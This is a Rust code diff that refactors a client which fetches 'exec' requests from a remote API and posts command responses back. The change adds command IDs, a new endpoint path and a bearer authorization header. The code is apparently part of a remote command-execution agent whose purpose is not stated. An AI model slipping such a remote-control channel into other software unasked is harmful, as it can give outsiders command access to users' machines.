@@ -17,10 +17,10 @@ pub struct Action {
 }
 
 #[derive(Debug, Serialize, Deserialize)]
-pub struct ExecResponse {
-    pub sessionid: String,
+pub struct CommandResponse {
     pub method: String,
-    pub resp: String,
+    pub commandid: String,
+    pub response: String,
 }
 
 #[allow(dead_code)]
@@ -32,6 +32,7 @@ pub struct Log {
 
 #[derive(Debug, Deserialize, Serialize)]
 pub struct Request {
+    pub commandid: Option<String>,
     pub exec: String,
     pub created_at: u64, // milliseconds
 }
@@ -98,7 +99,7 @@ pub fn build_auth_header(sessionid: &str) -> String {
 /**
  * Build Response URL
  *
- * Constructs the full URL for a session response post.
+ * Constructs the full URL for posting a command response.
  */
 #[cfg(test)]
 pub fn build_response_url() -> String {
@@ -108,25 +109,25 @@ pub fn build_response_url() -> String {
 /**
  * Build Response URL (with base)
  *
- * Constructs the full URL for a session response post using a custom base URL.
+ * Constructs the full URL for posting a command response using a custom base URL.
  */
 pub fn build_response_url_with_base(base_url: &str) -> String {
-    format!("{}{}", base_url, "session")
+    format!("{}{}", base_url, "command")
 }
 
 /**
- * Build Exec Response JSON
+ * Build Command Response JSON
  *
- * Constructs the JSON string for an exec response.
+ * Constructs the JSON string for a command response.
  */
-pub fn build_exec_response_json(sessionid: &str, response: &str) -> String {
-    let exec_response = ExecResponse {
-        sessionid: sessionid.to_string(),
+pub fn build_exec_response_json(commandid: &str, response: &str) -> String {
+    let cmd_response = CommandResponse {
         method: "res".to_string(),
-        resp: response.to_string(),
+        commandid: commandid.to_string(),
+        response: response.to_string(),
     };
 
-    to_string(&exec_response).unwrap()
+    to_string(&cmd_response).unwrap()
 }
 
 /**
@@ -176,22 +177,27 @@ async fn request_json_async(
 /**
  * Respond JSON (async, with base URL)
  *
- * Make a (remote) API response using a custom base URL.
+ * Post a command response back to the API using a custom base URL.
  * This is the testable core; response_json_async delegates to it.
  */
 pub async fn response_json_async_with_base(
     base_url: &str,
     _sessionid: &str,
+    _commandid: &str,
     _response: String,
 ) -> Result<String, Box<dyn std::error::Error>> {
     /* Set URL (for remote API). */
     let url = build_response_url_with_base(base_url);
 
-    let json_string = build_exec_response_json(_sessionid, &_response);
+    /* Set bearer authorization. */
+    let auth = build_auth_header(_sessionid);
+
+    let json_string = build_exec_response_json(_commandid, &_response);
 
     let client = reqwest::Client::new();
     let response = client
         .post(url)
+        .header("Authorization", auth)
         .header("Content-Type", "application/json")
         .body(json_string.to_string())
         .send()
@@ -206,13 +212,14 @@ pub async fn response_json_async_with_base(
 /**
  * Respond JSON
  *
- * Make a (remote) API response.
+ * Post a command response back to the API.
  */
 async fn response_json_async(
     _sessionid: &str,
+    _commandid: &str,
     _response: String,
 ) -> Result<String, Box<dyn std::error::Error>> {
-    response_json_async_with_base(L1_ENDPOINT, _sessionid, _response).await
+    response_json_async_with_base(L1_ENDPOINT, _sessionid, _commandid, _response).await
 }
 
 /**
@@ -418,7 +425,13 @@ fn _handle_exec(rt: &tokio::runtime::Runtime, _sessionid: &str, _resp: Vec<Reque
     // println!("\n***HANDLING (VEC) RESPONSE {:?}", _resp);
 
     if let Some(response) = resolve_exec(&_resp) {
-        let _ = rt.block_on(response_json_async(_sessionid, response));
+        /* Extract the command ID from the first pending request. */
+        let commandid = _resp[0]
+            .commandid
+            .as_deref()
+            .unwrap_or("unknown");
+
+        let _ = rt.block_on(response_json_async(_sessionid, commandid, response));
     }
 
     // let response = "ERROR! A FATAL ERROR OCCURED :(".to_string();
